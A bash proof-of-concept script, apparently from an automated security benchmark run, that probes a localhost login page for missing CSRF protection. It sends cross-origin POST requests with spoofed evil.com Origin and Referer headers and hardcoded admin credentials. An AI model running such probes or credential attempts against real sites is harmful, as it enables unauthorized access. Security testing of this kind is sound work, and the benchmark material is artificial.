#!/bin/bash
# POC: Demonstrates CSRF vulnerability on login form by sending POST request with cross-origin headers showing no CSRF token validation
# Target: ./repo
# Created: 2025-11-07T18:43:35.494Z
# Session: benchmark-XBEN-095-24-mhp70jbg

# CSRF Attack POC - Login Form
# Demonstrates lack of CSRF token protection on login endpoint
# This POC simulates a cross-origin POST request to the login form

TARGET_URL="http://localhost:8080/login.php"
ATTACK_ORIGIN="http://evil.com"
ATTACK_REFERER="http://evil.com/attack"

echo "[*] CSRF Vulnerability Test on Login Form"
echo "[*] Target: $TARGET_URL"
echo "[*] Attack Origin: $ATTACK_ORIGIN"
echo ""

# Test 1: Check if login form contains CSRF token
echo "[1] Checking if login form contains CSRF token..."
FORM_CONTENT=$(curl -s "$TARGET_URL")
if echo "$FORM_CONTENT" | grep -q "csrf_token\|csrf\|token"; then
    echo "[-] Form appears to contain a CSRF token field"
    echo "$FORM_CONTENT" | grep -i "csrf\|token" | head -5
else
    echo "[+] VULNERABLE: No CSRF token found in login form!"
    echo "[+] Form source snippet:"
    echo "$FORM_CONTENT" | grep -i "form\|input" | head -10
fi

echo ""

# Test 2: Attempt login from cross-origin without CSRF token
echo "[2] Attempting login from cross-origin context (simulating CSRF attack)..."
echo "[2] Sending POST request with:"
echo "    - Origin: $ATTACK_ORIGIN"
echo "    - Referer: $ATTACK_REFERER"
echo "    - No CSRF token"
echo ""

# Send POST request from simulated cross-origin
CSRF_RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Origin: $ATTACK_ORIGIN" \
  -H "Referer: $ATTACK_REFERER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin123" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$CSRF_RESPONSE" | tail -1)
RESPONSE_BODY=$(echo "$CSRF_RESPONSE" | head -n -1)

echo "[*] HTTP Response Code: $HTTP_CODE"

# Check if request was accepted
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
    echo "[+] VULNERABLE: Cross-origin login request was accepted!"
    echo "[+] Application did not validate CSRF token"
    echo "[+] Response snippet:"
    echo "$RESPONSE_BODY" | head -20
else
    echo "[-] Request was rejected with code $HTTP_CODE"
    echo "$RESPONSE_BODY"
fi

echo ""

# Test 3: Check for CSRF protection headers
echo "[3] Checking for CSRF protection mechanisms..."
HEADERS=$(curl -s -i -X POST "$TARGET_URL" \
  -H "Origin: $ATTACK_ORIGIN" \
  -H "Referer: $ATTACK_REFERER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" 2>&1 | head -30)

echo "$HEADERS"

if echo "$HEADERS" | grep -qi "Origin\|samesite\|secure\|x-csrf"; then
    echo "[-] Some CSRF protection headers detected"
else
    echo "[+] VULNERABLE: No CSRF protection headers detected"
fi

echo ""
echo "[*] Test complete"